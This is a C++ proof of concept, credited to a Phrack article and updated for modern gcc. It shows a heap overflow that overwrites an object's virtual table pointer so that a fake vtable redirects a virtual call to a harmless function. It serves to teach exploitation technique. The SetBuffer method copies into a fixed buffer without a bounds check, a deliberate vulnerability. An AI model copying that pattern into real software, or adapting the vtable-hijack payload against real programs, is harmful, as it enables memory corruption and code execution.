// bo3.cpp by rix, from Phrack 56:8 (http://phrack.org/issues/56/8.html) 5/1/2000
// updated to work with modern gcc by evm - 5/1/2023

#include <stdio.h>
#include <string.h>
#include <malloc.h>

#define byte unsigned char
#define qword unsigned long long

#define OBJ_SIZE 0x30
#define PTR_SIZE sizeof(qword)

//Class definitions
class BaseClass { 
private:
 char Buffer[32];
public:
 void SetBuffer(byte * msg) {
  qword msg_len = *(qword *)msg;
  memcpy(Buffer,msg+sizeof(qword),msg_len);
 }
 virtual void PrintBuffer() {
  printf("%s\n",Buffer);
 }
};

class MyClass1:public BaseClass {
public:
 void PrintBuffer() {
  printf("MyClass1: ");
  BaseClass::PrintBuffer();
 }
};

class MyClass2:public BaseClass {
public:
 void PrintBuffer() {
  printf("MyClass2: ");
  BaseClass::PrintBuffer();
 }
};

//Debugging functions - print out hex dumps 
#ifdef DEBUG
void hex_print(byte * buf, int size) {
  int i=0;
  for (i=0; i<size; i++) {
    if (i%16 == 0) {
      printf("%016llX: ",(qword)buf+i);
    }
    printf("%02X ",buf[i]);
    if (((i+1) % 16) == 0) {
      printf("  %016llX %016llX", *(qword *)(buf+i-15), *(qword *)(buf+i-7));
      printf("\n");
    }
  }
  if (i%16 != 0) {
    printf("\n");
  }
}

void objects_hex_print(BaseClass ** Object, char * msg) {
 for (int i=0; i<2; i++) {
   printf("Object[%d] (%s) at: %016llx\n", i, msg, (qword)(byte *)(Object[i])); 
   hex_print((byte *)&(*Object[i]), OBJ_SIZE);
 }
}
#else
  #define hex_print
  #define objects_hex_print
#endif

//Exploit-specific functions
//In a real exploitation scenario these would be created off-device
//but for the purpose of a PoC, we create them in the same program

void exp_entry() {
  printf("never gonna give you up!\n");
}

byte * BufferOverflow2() {

  //buffer to be written will be: | object | ptr | 
  //   (to overwrite the vptr at the start of 2nd object)

  //in order to format for SetBuffer, it will be | size | object | ptr | 
  byte * Buffer = (byte *)malloc(OBJ_SIZE+PTR_SIZE*2);
  
  *(qword *)Buffer = OBJ_SIZE + sizeof(qword);			//size of rest of buffer
  *(qword *)(Buffer + PTR_SIZE) = (qword)exp_entry;		//beginning of fake vtable, one entry for PrintBuffer
  *(qword *)(Buffer + OBJ_SIZE) = (qword)(Buffer + PTR_SIZE);   //will become vtable ptr in 2nd Object, pointing to fake vtable

#ifdef DEBUG
  printf("Buffer at: %016llx\n", (qword)(Buffer));
  hex_print((byte *)Buffer,OBJ_SIZE+PTR_SIZE*2);
#endif

  return Buffer;
}
 
int main() {
 BaseClass *Object[2];

 //Allocate objects on the stack
 Object[0]=new MyClass1;
 Object[1]=new MyClass2; 

 objects_hex_print(Object, "initial setup");

 //Allocate buffer and set it in Object[0] - this will overflow into Object[1] and overwrite its vptr
 Object[0]->SetBuffer(BufferOverflow2());

 objects_hex_print(Object, "after overflow");

 //Set up a valid message for 2nd Object
 byte msg2[strlen("string2")+sizeof(qword)];
 *(qword *)msg2 = strlen("string2");
 strcpy((char *)(msg2 + sizeof(qword)), "string2");
 Object[1]->SetBuffer(msg2);

 //Will print junk because Object[0] buffer is overwritten
 Object[0]->PrintBuffer();

 //This will cause exp_entry() to be run since Object[1] vptr -> Buffer vtable -> exp_entry()
 Object[1]->PrintBuffer();

 return 0;
}
